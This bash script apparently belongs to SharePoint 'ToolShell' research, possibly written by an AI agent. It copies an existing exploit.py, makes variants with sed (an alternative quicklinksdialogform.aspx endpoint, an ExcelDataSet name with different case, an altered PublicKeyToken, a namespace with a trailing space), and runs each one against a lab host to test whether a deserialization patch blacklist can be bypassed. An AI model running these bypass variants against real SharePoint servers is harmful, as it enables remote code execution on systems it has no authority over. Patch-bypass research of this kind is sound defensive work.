#!/bin/bash
TARGET="http://10.10.10.166"
ORIGINAL="/mnt/d/temp/sp-toolshell-research-additional-files/3.2.diff-triage/additional_resources/exploits/exploit.py"
RESULTS="/mnt/d/temp/sp-toolshell-research-additional-files/3.2.diff-triage/ai_results"

echo "=== Testing Alternative Entry Points and Edge Cases ==="
echo ""

# Test 7: Alternative endpoint (quicklinksdialogform.aspx from CVE-2020-1147)
echo "[Test 7] Alternative endpoint: quicklinksdialogform.aspx"
cp "$ORIGINAL" "$RESULTS/test_alt_endpoint.py"
sed -i 's|/_layouts/15/ToolPane.aspx|/_layouts/15/quicklinksdialogform.aspx|' "$RESULTS/test_alt_endpoint.py"
python3 "$RESULTS/test_alt_endpoint.py" --url "$TARGET" 2>&1 | grep -E "Status:|First.*bytes"
echo ""

# Test 8: Case variation in TypeName (ExcelDataset vs ExcelDataSet)
echo "[Test 8] Case variation: ExcelDataset (lowercase 's')"
cp "$ORIGINAL" "$RESULTS/test_case.py"
sed -i 's/ExcelDataSet/ExcelDataset/g' "$RESULTS/test_case.py"
python3 "$RESULTS/test_case.py" --url "$TARGET" 2>&1 | grep -E "Status:|First.*bytes"
echo ""

# Test 9: Assembly with different PublicKeyToken (if blacklist checks it)
echo "[Test 9] Different PublicKeyToken"
cp "$ORIGINAL" "$RESULTS/test_token.py"
sed -i 's/PublicKeyToken=71e9bce111e9429c/PublicKeyToken=71e9bce111e9429d/' "$RESULTS/test_token.py"
python3 "$RESULTS/test_token.py" --url "$TARGET" 2>&1 | grep -E "Status:|First.*bytes"
echo ""

# Test 10: Version 15.0.0.0 with trailing space (combined approach)
echo "[Test 10] Version 15.0.0.0 + trailing space namespace"
cp "$ORIGINAL" "$RESULTS/test_v15.py"
sed -i 's/Version=16\.0\.0\.0/Version=15.0.0.0/' "$RESULTS/test_v15.py"
sed -i 's/Namespace="Microsoft.PerformancePoint.Scorecards"/Namespace="Microsoft.PerformancePoint.Scorecards "/' "$RESULTS/test_v15.py"
python3 "$RESULTS/test_v15.py" --url "$TARGET" 2>&1 | grep -E "Status:|First.*bytes"
echo ""

echo "=== Additional Tests Complete ==="
